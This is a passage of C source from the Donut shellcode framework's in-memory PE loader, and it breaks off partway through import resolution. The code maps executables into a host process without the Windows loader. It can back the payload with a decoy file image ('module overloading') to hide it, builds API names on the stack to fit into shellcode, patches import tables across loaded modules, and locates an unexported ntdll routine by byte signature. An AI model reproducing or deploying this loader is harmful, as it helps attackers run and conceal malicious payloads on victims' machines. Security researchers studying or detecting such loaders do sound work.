/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#ifdef _WIN64
#define IMAGE_REL_TYPE IMAGE_REL_BASED_DIR64
#else
#define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
#endif

typedef struct _IMAGE_RELOC {
    WORD offset :12;
    WORD type   :4;
} IMAGE_RELOC, *PIMAGE_RELOC;

// Names that are not in the instance's API table have to be resolved by string
// through GetProcAddress. exe2h ships only .text, so an ordinary literal (which
// lands in .rdata) would point outside the shellcode. Build them in a stack
// buffer byte by byte instead: volatile stores cannot be folded back into a
// read-only constant.
static void name_ntdll(volatile char *p) {
    p[0]='n'; p[1]='t'; p[2]='d'; p[3]='l'; p[4]='l'; p[5]=0;
}

static void name_rtladdfunctiontable(volatile char *p) {
    p[0]='R';  p[1]='t';  p[2]='l';  p[3]='A';  p[4]='d';  p[5]='d';
    p[6]='F';  p[7]='u';  p[8]='n';  p[9]='c';  p[10]='t'; p[11]='i';
    p[12]='o'; p[13]='n'; p[14]='T'; p[15]='a'; p[16]='b'; p[17]='l';
    p[18]='e'; p[19]=0;
}

#ifdef _WIN64
static void name_rtlpctofileheader(volatile char *p) {
    p[0]='R'; p[1]='t';  p[2]='l';  p[3]='P';  p[4]='c';  p[5]='T';
    p[6]='o'; p[7]='F';  p[8]='i';  p[9]='l';  p[10]='e'; p[11]='H';
    p[12]='e'; p[13]='a'; p[14]='d'; p[15]='e'; p[16]='r'; p[17]=0;
}

static void name_rtldeletefunctiontable(volatile char *p) {
    p[0]='R';  p[1]='t';  p[2]='l';  p[3]='D';  p[4]='e';  p[5]='l';
    p[6]='e';  p[7]='t';  p[8]='e';  p[9]='F';  p[10]='u'; p[11]='n';
    p[12]='c'; p[13]='t'; p[14]='i'; p[15]='o'; p[16]='n'; p[17]='T';
    p[18]='a'; p[19]='b'; p[20]='l'; p[21]='e'; p[22]=0;
}

// One IAT slot redirected to the pc2f stub, kept so it can be restored when the
// payload unloads. Without this the host keeps calling into a stub whose page is
// freed (and whose address range may be reused), corrupting exception handling
// in unrelated modules.
#define PC2F_MAX_PATCHES 256
typedef struct {
    PULONG_PTR slot;   // address of the IAT entry
    ULONG_PTR  orig;   // value before redirection
} PC2F_PATCH;

typedef struct {
    PVOID      stub;                  // the allocated stub page (NULL if none)
    ULONG_PTR  orig;                  // real RtlPcToFileHeader
    DWORD      count;                 // number of recorded patches
    PC2F_PATCH patches[PC2F_MAX_PATCHES];
} PC2F_HOOK;

#endif

typedef BOOL  (WINAPI *DllMain_t)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
typedef VOID  (WINAPI *Start_t)(PPEB);
typedef VOID  (WINAPI *DllParam_t)(PVOID);
typedef VOID  (WINAPI *DllVoid_t)(VOID);

#ifdef _WIN64
// C++ exceptions in a manually mapped image.
//
// _CxxThrowException identifies the throwing module with
// RtlPcToFileHeader(pThrowInfo). The image is not in the loader's module list, so
// the call returns NULL and the runtime raises a *foreign* exception (magic
// 0x1994000); FindHandler never matches a catch, even catch(...). Measured: with
// the call answered normally, the same throw reaches its catch.
//
// Hook that import inside every loaded module (vcruntime140[_1] for /MD) and in
// the payload image itself (/MT), with a small stub that answers for addresses in
// the mapped image and forwards everything else to the real function. The stub is
// position independent and embeds base/end/original, so it owns no state outside
// its own page.
static PVOID make_pc2f_stub(PDONUT_INSTANCE inst, ULONG_PTR base, ULONG_PTR end, PVOID orig) {
    BYTE *s = (BYTE*)inst->api.VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (s == NULL) return NULL;

    #ifdef _WIN64
      // rcx = pc, rdx = base*
      s[0]=0x49; s[1]=0xB8; *(ULONG_PTR*)(s+2)  = base;   // mov r8, base
      s[10]=0x49; s[11]=0xB9; *(ULONG_PTR*)(s+12) = end;    // mov r9, end
      s[20]=0x4C; s[21]=0x39; s[22]=0xC1;                   // cmp rcx, r8
      s[23]=0x72; s[24]=0x11;                               // jb pass
      s[25]=0x4C; s[26]=0x39; s[27]=0xC9;                   // cmp rcx, r9
      s[28]=0x73; s[29]=0x0C;                               // jae pass
      s[30]=0x48; s[31]=0x85; s[32]=0xD2;                   // test rdx, rdx
      s[33]=0x74; s[34]=0x03;                               // jz retbase
      s[35]=0x4C; s[36]=0x89; s[37]=0x02;                   // mov [rdx], r8
      s[38]=0x4C; s[39]=0x89; s[40]=0xC0;                   // mov rax, r8  (retbase)
      s[41]=0xC3;                                           // ret
      s[42]=0x48; s[43]=0xB8; *(ULONG_PTR*)(s+44) = (ULONG_PTR)orig; // mov rax, orig (pass)
      s[52]=0xFF; s[53]=0xE0;                               // jmp rax
    #else
      // [esp+4] = pc, [esp+8] = base*; NTAPI, so ret 8
      s[0]=0x8B; s[1]=0x44; s[2]=0x24; s[3]=0x04;           // mov eax, [esp+4]
      s[4]=0xB9;  *(ULONG_PTR*)(s+5)  = base;               // mov ecx, base
      s[9]=0x39; s[10]=0xC8;                                // cmp eax, ecx
      s[11]=0x72; s[12]=0x18;                               // jb pass
      s[13]=0xBA; *(ULONG_PTR*)(s+14) = end;                // mov edx, end
      s[18]=0x39; s[19]=0xD0;                               // cmp eax, edx
      s[20]=0x73; s[21]=0x0F;                               // jae pass
      s[22]=0x8B; s[23]=0x54; s[24]=0x24; s[25]=0x08;       // mov edx, [esp+8]
      s[26]=0x85; s[27]=0xD2;                               // test edx, edx
      s[28]=0x74; s[29]=0x02;                               // jz retbase
      s[30]=0x89; s[31]=0x0A;                               // mov [edx], ecx
      s[32]=0x89; s[33]=0xC8;                               // mov eax, ecx (retbase)
      s[34]=0xC2; s[35]=0x08; s[36]=0x00;                   // ret 8
      s[37]=0xB8; *(ULONG_PTR*)(s+38) = (ULONG_PTR)orig;    // mov eax, orig (pass)
      s[42]=0xFF; s[43]=0xE0;                               // jmp eax
    #endif
    return s;
}

static void patch_pc2f_module(PDONUT_INSTANCE inst, PVOID base, DWORD importRVA, PVOID stub, PC2F_HOOK *hook) {
    PIMAGE_IMPORT_DESCRIPTOR imp;
    PIMAGE_THUNK_DATA oft, ft;
    PIMAGE_IMPORT_BY_NAME ibn;
    char target[20];
    DWORD old;

    if (base == NULL || importRVA == 0) return;
    name_rtlpctofileheader(target);
    imp = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, base, importRVA);

    for (; imp->Name != 0; imp++) {
        ft = RVA2VA(PIMAGE_THUNK_DATA, base, imp->FirstThunk);
        oft = imp->OriginalFirstThunk ?
                RVA2VA(PIMAGE_THUNK_DATA, base, imp->OriginalFirstThunk) : ft;
        for (; oft->u1.AddressOfData != 0; oft++, ft++) {
            if (IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal)) continue;
            ibn = RVA2VA(PIMAGE_IMPORT_BY_NAME, base, oft->u1.AddressOfData);
            if (_strcmp((const char*)ibn->Name, target) != 0) continue;
            if (ft->u1.Function == (ULONG_PTR)stub) continue;
            if (inst->api.VirtualProtect(&ft->u1.Function, sizeof(ULONG_PTR), PAGE_READWRITE, &old)) {
                // Record the original value so unhook can restore it. If the
                // record table is full, leave this slot unpatched rather than
                // redirect it without a way back.
                if (hook->count < PC2F_MAX_PATCHES) {
                    hook->patches[hook->count].slot = &ft->u1.Function;
                    hook->patches[hook->count].orig = ft->u1.Function;
                    hook->count++;
                    ft->u1.Function = (ULONG_PTR)stub;
                }
                inst->api.VirtualProtect(&ft->u1.Function, sizeof(ULONG_PTR), old, &old);
            }
        }
    }
}

// Restore every recorded IAT slot to its original value and free the stub page.
// Called from the payload cleanup path so the host is left exactly as it was
// found: no dangling pointer into freed memory, no leaked executable page.
static void unhook_cxx_module_base(PDONUT_INSTANCE inst, PC2F_HOOK *hook) {
    DWORD i, old;
    if (hook->stub == NULL) return;
    for (i = 0; i < hook->count; i++) {
        // Only restore a slot that still points at our stub; if something else
        // legitimately re-hooked it afterwards, leave that alone.
        if (*hook->patches[i].slot == (ULONG_PTR)hook->stub) {
            if (inst->api.VirtualProtect(hook->patches[i].slot, sizeof(ULONG_PTR), PAGE_READWRITE, &old)) {
                *hook->patches[i].slot = hook->patches[i].orig;
                inst->api.VirtualProtect(hook->patches[i].slot, sizeof(ULONG_PTR), old, &old);
            }
        }
    }
    inst->api.VirtualFree(hook->stub, 0, MEM_RELEASE);
    hook->stub = NULL;
    hook->count = 0;
}

static void hook_cxx_module_base(PDONUT_INSTANCE inst, PVOID cs, PIMAGE_NT_HEADERS nt, PC2F_HOOK *hook) {
    PPEB                    peb;
    PPEB_LDR_DATA           ldr;
    PLDR_DATA_TABLE_ENTRY   dte;
    PIMAGE_DOS_HEADER       dos;
    PIMAGE_NT_HEADERS       mnt;
    PVOID                   orig, stub;
    char                    api[20], modname[12];
    HMODULE                 ntdll;

    hook->stub = NULL;
    hook->orig = 0;
    hook->count = 0;

    name_rtlpctofileheader(api);
    // Kernel32 exports a thunk through an IAT slot that the traversal below
    // can replace. Saving that thunk makes the fallback recurse into our own
    // stub for every non-payload address (including DXGI initialization).
    // Resolve the implementation in its owning module, not the forwarding thunk.
    name_ntdll(modname);
    ntdll = inst->api.GetModuleHandleA(modname);
    orig = (ntdll != NULL) ? (PVOID)inst->api.GetProcAddress(ntdll, api) : NULL;
    if (orig == NULL) return;

    stub = make_pc2f_stub(inst, (ULONG_PTR)cs,
                          (ULONG_PTR)cs + nt->OptionalHeader.SizeOfImage, orig);
    if (stub == NULL) return;

    hook->stub = stub;
    hook->orig = (ULONG_PTR)orig;

    // Every loaded module that imports the function (vcruntime140[_1] for /MD,
    // and any other CRT a payload may use).
    peb = (PPEB)NtCurrentTeb()->ProcessEnvironmentBlock;
    ldr = (PPEB_LDR_DATA)peb->Ldr;
    for (dte = (PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;
         dte->DllBase != NULL;
         dte = (PLDR_DATA_TABLE_ENTRY)dte->InLoadOrderLinks.Flink) {
        // The implementation's own imports must remain outside interception.
        if (dte->DllBase == (PVOID)ntdll) continue;
        dos = (PIMAGE_DOS_HEADER)dte->DllBase;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
        mnt = RVA2VA(PIMAGE_NT_HEADERS, dte->DllBase, dos->e_lfanew);
        if (mnt->Signature != IMAGE_NT_SIGNATURE) continue;
        patch_pc2f_module(inst, dte->DllBase,
            mnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, stub, hook);
    }

    // The payload image is not in that list; patch its own IAT too (/MT).
    patch_pc2f_module(inst, cs,
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, stub, hook);
}
#endif

// for setting the command line...
typedef CHAR**  (WINAPI *p_acmdln_t)(VOID);
typedef WCHAR** (WINAPI *p_wcmdln_t)(VOID);

BOOL SetCommandLineW(PDONUT_INSTANCE inst, PCWSTR NewCommandLine);
BOOL IsExitAPI(PDONUT_INSTANCE inst, PCHAR name);
BOOL CheckForILOnly(PIMAGE_NT_HEADERS nthost, ULONG_PTR host);

// Resolve a forwarded export ("DLL.Func") through its target module. The OS
// loader does this transparently; a manual mapper that calls exports by address
// would otherwise jump into the forwarder string. Returns NULL when the target
// module is not loaded in the host or the function is missing.
static PVOID resolve_forwarder(PDONUT_INSTANCE inst, PCHAR fwd) {
    PCHAR   dot;
    CHAR    modname[64];
    INT     i, len;
    HMODULE m;
    PVOID   fn;

    if(fwd == NULL) return NULL;

    // Locate the separator between the module and the function.
    dot = NULL;
    for(i = 0; fwd[i] != 0 && i < 63; i++) {
        if(fwd[i] == '.') { dot = &fwd[i]; break; }
    }
    if(dot == NULL || dot == fwd) return NULL;   // no separator, or empty module
    len = (INT)(dot - fwd);
    if(len >= 63) return NULL;
    for(i = 0; i < len; i++) modname[i] = fwd[i];
    modname[len] = 0;

    m = inst->api.GetModuleHandleA(modname);
    if(m == NULL) {
        // Forwarders usually name the module without its extension ("msvcrt"),
        // but GetModuleHandle wants the full name. Append ".dll" and retry.
        if(len + 4 >= 63) return NULL;
        modname[len]     = '.';
        modname[len + 1] = 'd';
        modname[len + 2] = 'l';
        modname[len + 3] = 'l';
        modname[len + 4] = 0;
        m = inst->api.GetModuleHandleA(modname);
        if(m == NULL) return NULL;
    }

    fn = inst->api.GetProcAddress(m, dot + 1);
    return fn;
}

#ifdef _WIN64
// --- Static TLS registration (x64 only) -------------------------------------
//
// A manually mapped module with a static TLS template needs a *static* TLS index
// allocated by the loader: the compiler emits direct indexing into
// TEB.ThreadLocalStoragePointer[index], and no exported API allocates one (TlsAlloc
// covers the separate dynamic array). ntdll's internal LdrpHandleTlsData does what
// the OS loader does -- allocates an index, writes AddressOfIndex, copies the
// template into the current thread's slot, and registers the module in LdrpTlsList
// so threads created later get their copy too. It is not exported, so it is found
// by a byte signature inside ntdll's mapped image. When the signature is absent
// (an unrecognised build) registration is skipped and the module runs with the
// same degraded TLS behaviour as before. The loader lock is not taken here: the
// common case runs on a single thread, and this matches the mapping philosophy of
// the rest of the loader.

// Fill a stack buffer with the x64 prologue signature of LdrpHandleTlsData
// (Windows 10 21H2/22H2). Byte stores cannot be folded into .rdata, so the
// signature ships entirely in .text like every other literal in this loader.
static void fill_ldrp_tls_pattern(volatile unsigned char *p) {
    p[0]=0x48; p[1]=0x89; p[2]=0x5C; p[3]=0x24; p[4]=0x10;
    p[5]=0x48; p[6]=0x89; p[7]=0x74; p[8]=0x24; p[9]=0x18;
    p[10]=0x48; p[11]=0x89; p[12]=0x7C; p[13]=0x24; p[14]=0x20;
    p[15]=0x41; p[16]=0x54; p[17]=0x41; p[18]=0x56; p[19]=0x41; p[20]=0x57;
    p[21]=0x48; p[22]=0x81; p[23]=0xEC; p[24]=0x00; p[25]=0x01; p[26]=0x00; p[27]=0x00;
}

// Scan ntdll's mapped image for the LdrpHandleTlsData signature and return the
// matching address, or NULL when the build is not recognised.
static PVOID find_ldrp_handle_tls_data(PDONUT_INSTANCE inst) {
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    HMODULE           ntdll;
    char              modname[12];
    unsigned char     pat[28];
    PBYTE             img, end, p;
    DWORD             imgSize, i;

    name_ntdll(modname);
    ntdll = inst->api.GetModuleHandleA(modname);
    if(ntdll == NULL) return NULL;

    fill_ldrp_tls_pattern(pat);

    dos = (PIMAGE_DOS_HEADER)ntdll;
    nt  = RVA2VA(PIMAGE_NT_HEADERS, ntdll, dos->e_lfanew);
    if(nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    imgSize = nt->OptionalHeader.SizeOfImage;
    img = (PBYTE)ntdll;
    end = img + imgSize - sizeof(pat);

    for(p = img; p < end; p++) {
      for(i = 0; i < sizeof(pat); i++) {
        if(p[i] != pat[i]) break;
      }
      if(i == sizeof(pat)) return (PVOID)p;
    }
    return NULL;
}

// Hand a synthetic LDR_DATA_TABLE_ENTRY (only DllBase set, the rest zero -- which
// is all LdrpHandleTlsData needs) to LdrpHandleTlsData. The entry is intentionally
// leaked: LdrpTlsList keeps referencing it so threads created later still receive
// their TLS block. Returns FALSE only when the entry cannot be allocated.
static BOOL register_static_tls(PDONUT_INSTANCE inst, PVOID cs, PVOID fn) {
    typedef void (NTAPI *LdrpHandleTlsData_t)(PVOID LdrEntry);
    LdrpHandleTlsData_t f = (LdrpHandleTlsData_t)fn;
    PBYTE entry;

    entry = (PBYTE)inst->api.VirtualAlloc(NULL, 0x200,
      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(entry == NULL) return FALSE;

    Memset(entry, 0, 0x200);
    // LDR_DATA_TABLE_ENTRY.DllBase is at offset 0x30 on x64.
    *(PVOID*)(entry + 0x30) = cs;

    DPRINT("Registering static TLS for %p via LdrpHandleTlsData", cs);
    f((PVOID)entry);
    return TRUE;
}
#endif

// In-Memory execution of unmanaged DLL file. YMMV with EXE files requiring subsystem..
VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
    PIMAGE_DOS_HEADER           dos, doshost;
    PIMAGE_NT_HEADERS           nt, nthost, ntnew, origmod = NULL;
    PIMAGE_SECTION_HEADER       sh;
    PIMAGE_SECTION_HEADER       shcp = NULL;
    PIMAGE_THUNK_DATA           oft, ft;
    PIMAGE_IMPORT_BY_NAME       ibn;
    PIMAGE_IMPORT_DESCRIPTOR    imp;
    PIMAGE_DELAYLOAD_DESCRIPTOR del;
    PIMAGE_EXPORT_DIRECTORY     exp;
    PIMAGE_TLS_DIRECTORY        tls;
    PIMAGE_TLS_CALLBACK         *callbacks;
    PIMAGE_RELOC                list;
    PIMAGE_BASE_RELOCATION      ibr;
    IMAGE_NT_HEADERS            ntc;
    DWORD                       rva, size, fwd_rva, exp_size;
    PDWORD                      adr;
    PDWORD                      sym;
    PWORD                       ord;
    PBYTE                       ofs;
    PCHAR                       str, name;
    HMODULE                     dll;
    ULONG_PTR                   ptr;
    DllMain_t                   DllMain;            // DLL
    Start_t                     Start;              // EXE
    DllParam_t                  DllParam = NULL;    // DLL function accepting one string parameter
    DllVoid_t                   DllVoid  = NULL;    // DLL function that accepts no parametersd
    LPVOID                      base, host;
    DWORD                       i, cnt;
    HANDLE                      hThread;
    WCHAR                       buf[DONUT_MAX_NAME+1];
    DWORD                       size_of_img;
    PVOID                       baseAddress;
    SIZE_T                      numBytes;
    DWORD                       newprot, oldprot;
    NTSTATUS                    status;
    HANDLE                      hSection;
    LARGE_INTEGER               liSectionSize;
    PVOID                       cs = NULL;
    SIZE_T                      viewSize = 0;
    BOOL                        has_reloc;
    BOOL                        dll_attached = FALSE;
    BOOL                        tls_attached = FALSE;
    PIMAGE_TLS_CALLBACK         *tls_cbs = NULL;
#ifdef _WIN64
    PC2F_HOOK                   cxx_hook;
    PVOID                       ft_table = NULL;   // registered RUNTIME_FUNCTION table
    DWORD                       ft_count = 0;
    HMODULE                     ft_ntdll = NULL;   // ntdll handle for cleanup resolution
#endif

    base = mod->data;
    dos  = (PIMAGE_DOS_HEADER)base;
    nt   = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    
    // before doing anything. check compatibility between exe/dll and host process.
    host    = inst->api.GetModuleHandle(NULL);
    doshost = (PIMAGE_DOS_HEADER)host;
    nthost  = RVA2VA(PIMAGE_NT_HEADERS, host, doshost->e_lfanew);
    
    if (nt->FileHeader.Machine != nthost->FileHeader.Machine) {
      // This is not always the case:
      // If IL_ONLY PE32 is loaded on 64-bit Windows and we load a PE32+ exe/dll
		  if ((nt->FileHeader.Machine == IMAGE_FILE_MACHINE_I386 && nthost->FileHeader.Machine == IMAGE_FILE_MACHINE_IA64)
			  && !CheckForILOnly(nthost, (ULONG_PTR)host)) {
			  DPRINT("Host process %08lx and file %08lx are not compatible...cannot load.",
				nthost->FileHeader.Machine, nt->FileHeader.Machine);
			  return;
		  }
	  }
    
    DPRINT("Creating section of size %" PRIi32 " (0x%" PRIx32 ") bytes for file", 
      nt->OptionalHeader.SizeOfImage, nt->OptionalHeader.SizeOfImage);
    
    liSectionSize.QuadPart = nt->OptionalHeader.SizeOfImage;

    // check if the binary has relocation information
    size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    has_reloc = size == 0? FALSE : TRUE;
    if (!has_reloc)
    {
      DPRINT("No relocation information present, setting the base to: 0x%p", (PVOID)nt->OptionalHeader.ImageBase);
      cs = (PVOID)nt->OptionalHeader.ImageBase;
    }

    DPRINT("Creating section to store PE.");
    DPRINT("Requesting section size: %d", nt->OptionalHeader.SizeOfImage);
    if (inst->decoy[0] == 0) {
      status = inst->api.NtCreateSection(&hSection, SECTION_ALL_ACCESS, 0, &liSectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
      DPRINT("NTSTATUS: %d", status);
      if(status != 0) return;
    } else {
      DPRINT("Decoy file path: %s", inst->decoy);
      // implement module overloading by creating a MEM_IMAGE section backed by the decoy file
      HANDLE hDecoy = inst->api.CreateFileA(inst->decoy, 
        GENERIC_READ, 
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
      DPRINT("File handle: %p", hDecoy);
      
      if (hDecoy == INVALID_HANDLE_VALUE || hDecoy == 0) {
        DPRINT("Error opening decoy file: %d", inst->api.GetLastError());
        return;
      }

      LARGE_INTEGER max = { 0 };

      // check if decoy file is too small and if so allow the section to be extra large
      if (inst->api.GetFileSizeEx(hDecoy, &max) != 0) {

        if (nt->OptionalHeader.SizeOfImage > max.u.LowPart) {
          DPRINT("Decoy file is too small! It cannot be used.");

          /*  I tried to have this create the section extra-large but NtCreateSection fails with STATUS_SECTION_TOO_BIG.
              I tried specifying PAGE_READWRITE to bypass this, but that causes it to fail because you can't create an image-backed
                shared memory section with those permissions.
              
              So I leave this note in case I or another figures out how to create the section 
                extra-large when the decoy file is too small. 
          
          */
          return;
        }

      } else {
        DPRINT("Error getting size of decoy file: %d", inst->api.GetLastError());
        return;
      }      
        
      status = inst->api.NtCreateSection(&hSection, SECTION_ALL_ACCESS, 0, NULL, PAGE_READONLY, SEC_IMAGE, hDecoy);

      inst->api.CloseHandle(hDecoy);

      DPRINT("NTSTATUS: %d", status);
      if(status != 0) return;
    }
    
    DPRINT("Mapping local view of section to store PE.");
    status = inst->api.NtMapViewOfSection(hSection, inst->api.GetCurrentProcess(), &cs, 0, 0, 0, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
    DPRINT("View size: %lld", viewSize);

    ntnew = RVA2VA(PIMAGE_NT_HEADERS, cs, dos->e_lfanew);

    DPRINT("NTSTATUS: %d", status);
    if(status != 0 && status != 0x40000003) return;

    DPRINT("Mapped to address: %p", cs);
    
    if(cs == NULL) return;
    
    if (inst->decoy[0] != 0) 
    {
      // if module overloading, set everything to RW because they will start out otherwise
      inst->api.VirtualProtect(cs, viewSize, PAGE_READWRITE, &oldprot);

      DPRINT("Making copy of decoy module's headers for later use.");

      origmod = inst->api.VirtualAlloc(NULL, nt->OptionalHeader.SizeOfHeaders, 
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

      Memcpy(origmod, cs, nt->OptionalHeader.SizeOfHeaders);

      DPRINT("Wiping section view before mapping to it.");
      Memset(cs, 0, viewSize);
    }

    DPRINT("Copying Headers");
    DPRINT("nt->FileHeader.SizeOfOptionalHeader: %d", nt->FileHeader.SizeOfOptionalHeader);
    DPRINT("nt->OptionalHeader.SizeOfHeaders: %d", nt->OptionalHeader.SizeOfHeaders);

    DPRINT("Copying first section");
    DPRINT("Copying %d bytes", nt->OptionalHeader.SizeOfHeaders);
    Memcpy(cs, base, nt->OptionalHeader.SizeOfHeaders);

    DPRINT("DOS Signature (Magic): %08lx, %p", ((PIMAGE_DOS_HEADER)cs)->e_magic, &(((PIMAGE_DOS_HEADER)cs)->e_magic));
    DPRINT("NT Signature: %lx, %p", ntnew->Signature, &(ntnew->Signature));

    DPRINT("Updating ImageBase to final base address");
    ntnew->OptionalHeader.ImageBase = (ULONGLONG)cs;
    DPRINT("Updated ImageBase: %lluX", ntnew->OptionalHeader.ImageBase);

    DPRINT("Copying each section to memory: %p", cs);
    sh = IMAGE_FIRST_SECTION(ntnew);
      
    for(i=0; i<ntnew->FileHeader.NumberOfSections; i++) {
      PBYTE dest = (PBYTE)cs + sh[i].VirtualAddress;
      PBYTE source = (PBYTE)base + sh[i].PointerToRawData;

      if (sh[i].SizeOfRawData == 0)
        DPRINT("Section is empty of data, but may contain uninitialized data.");
      
      // Copy the section data
      Memcpy(dest,
          source,
          sh[i].SizeOfRawData);
      
      // Update the actual address of the section
      sh[i].Misc.PhysicalAddress = (DWORD)*dest;

      DPRINT("Copied section name: %s", sh[i].Name);
      DPRINT("Copied section source offset: 0x%X", sh[i].VirtualAddress);
      DPRINT("Copied section dest offset: 0x%X", sh[i].PointerToRawData);
      DPRINT("Copied section absolute address: 0x%lX", sh[i].Misc.PhysicalAddress);
      DPRINT("Copied section size: 0x%lX", sh[i].SizeOfRawData);
    }
    
    DPRINT("Sections copied.");

    ofs  = (PBYTE)cs - nt->OptionalHeader.ImageBase;
    DPRINT("Image Relocation Offset: 0x%p", ofs);

    if (has_reloc && ofs != 0) {
      DPRINT("Applying Relocations");
      
      rva  = ntnew->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
      ibr = RVA2VA(PIMAGE_BASE_RELOCATION, cs, rva);
      
      while ((PBYTE)ibr < ((PBYTE)cs + rva + size) && ibr->SizeOfBlock != 0) {
        list = (PIMAGE_RELOC)(ibr + 1);
  
        while ((PBYTE)list != (PBYTE)ibr + ibr->SizeOfBlock) {
          // check that the RVA is within the boundaries of the PE
          if (ibr->VirtualAddress + list->offset < ntnew->OptionalHeader.SizeOfImage) {
            PULONG_PTR address = (PULONG_PTR)((PBYTE)cs + ibr->VirtualAddress + list->offset);
            if (list->type == IMAGE_REL_BASED_DIR64) {
              *address += (ULONG_PTR)ofs;
            } else if (list->type == IMAGE_REL_BASED_HIGHLOW) {
              *address += (DWORD)(ULONG_PTR)ofs;
            } else if (list->type == IMAGE_REL_BASED_HIGH) {
              *address += HIWORD(ofs);
            } else if (list->type == IMAGE_REL_BASED_LOW) {
              *address += LOWORD(ofs);
            } else if (list->type != IMAGE_REL_BASED_ABSOLUTE) {
              DPRINT("ERROR: Unrecognized Relocation type %08lx.", list->type);
              goto pe_cleanup;
            }
          }
          list++;
        }
        ibr = (PIMAGE_BASE_RELOCATION)list;
      }
    }
    
    rva = ntnew->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    
    if(rva != 0) {
      DPRINT("Processing the Import Table");
      
      imp = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, cs, rva);
        
      // For each DLL
      for (;imp->Name!=0; imp++) {
        name = RVA2VA(PCHAR, cs, imp->Name);
        
        dll = xGetLibAddress(inst, name);
        
        // Resolve the API for this library. Some linkers emit an import
        // descriptor with no lookup table; the lookup then lives in the IAT
        // itself, which is the standard fallback.
        ft  = RVA2VA(PIMAGE_THUNK_DATA, cs, imp->FirstThunk);
        oft = imp->OriginalFirstThunk ?
                RVA2VA(PIMAGE_THUNK_DATA, cs, imp->OriginalFirstThunk) : ft;
          
        // For each API
        for (;; oft++, ft++) {
          // No API left?
          if (oft->u1.AddressOfData == 0) break;
          
          // Resolve by ordinal?
          if (IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal)) {
            ft->u1.Function = (ULONG_PTR)xGetProcAddress(inst, dll, NULL, oft->u1.Ordinal);
          } else {
            // Resolve by name
            ibn = RVA2VA(PIMAGE_IMPORT_BY_NAME, cs, oft->u1.AddressOfData);

            // run entrypoint as thread?
            if(mod->thread != 0) {
              // if this is an exit-related API, replace it with RtlExitUserThread
              if(IsExitAPI(inst, ibn->Name)) {
                DPRINT("Replacing %s!%s with ntdll!RtlExitUserThread", name, ibn->Name);
                ft->u1.Function = (ULONG_PTR)inst->api.RtlExitUserThread;
                continue;
              }
            }
            ft->u1.Function = (ULONG_PTR)xGetProcAddress(inst, dll, ibn->Name, 0);
          }
        }
      }
    }
    
    rva = ntnew->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress;
    
    if(rva != 0) {
      DPRINT("Processing Delayed Import Table");
      
      del = RVA2VA(PIMAGE_DELAYLOAD_DESCRIPTOR, cs, rva);
      
      // For each DLL
      for (;del->DllNameRVA != 0; del++) {
        name = RVA2VA(PCHAR, cs, del->DllNameRVA);
        
        dll = xGetLibAddress(inst, name);
        
        if(dll == NULL) continue;

        // No name table means the delay imports are already resolved by
        // address; there is nothing to look up.
        if(del->ImportNameTableRVA == 0) continue;

        // Resolve the API for this library
        oft = RVA2VA(PIMAGE_THUNK_DATA, cs, del->ImportNameTableRVA);
        ft  = RVA2VA(PIMAGE_THUNK_DATA, cs, del->ImportAddressTableRVA);
          
        // For each API
        for (;; oft++, ft++) {
          // No API left?
          if (oft->u1.AddressOfData == 0) break;

          // Resolve by ordinal?
          if (IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal)) {
            ft->u1.Function = (ULONG_PTR)xGetProcAddress(inst, dll, NULL, oft->u1.Ordinal);
